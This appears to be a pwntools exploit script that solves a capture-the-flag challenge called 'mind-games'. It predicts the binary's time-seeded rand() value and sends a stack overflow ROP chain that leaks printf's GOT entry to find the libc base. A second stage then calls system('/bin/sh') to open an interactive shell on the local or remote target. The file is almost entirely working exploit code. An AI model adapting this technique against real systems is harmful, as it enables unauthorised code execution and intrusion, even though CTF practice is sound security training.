#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import ctypes

context.update(arch="amd64", os="linux")
context.log_level = 'info'

# shortcuts
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)

exe = ELF('./mind-games')
libc = ELF('./lib/libc.so.6')
rop = ROP(exe)

host, port = "pwn.chal.ctf.gdgalgiers.com", "1404"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process(exe.path)

LIBC = ctypes.cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
LIBC.srand(LIBC.time(0))

bss = 0x404a00

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
leave_ret = rop.find_gadget(['leave', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
pop_rsi = 0x00000000004014c1 # pop rsi ; pop r15 ; ret

# dump printf got entry, and read second stage payload on .bss with scanf("%s", bss)
p.sendlineafter('mind? ', str(LIBC.rand()).ljust(0x30,'.')+p64(bss) +p64(pop_rdi)+p64(exe.got['printf'])+p64(exe.sym['puts'])+p64(pop_rdi)+p64(0x403049)+p64(pop_rsi)+p64(bss)+p64(0xdeadbeef)+p64(ret)+p64(exe.sym['__isoc99_scanf'])+p64(leave_ret)  )

if args.REMOTE:
  p.recvuntil('!\n', drop=True)
else:
  p.recvuntil('\n\n', drop=True)

# calculate libc base from printf got entry leak
libc.address = u64(p.recvuntil('\n', drop=True).ljust(8,b'\x00')) - libc.sym['printf']
print('libc base = '+hex(libc.address))

# execute system('/bin/sh')
payload2 = '/bin/sh\x00'
payload2 += p64(pop_rdi)+p64(bss)+p64(ret)+p64(libc.sym['system'])
p.sendline(payload2)

p.interactive()

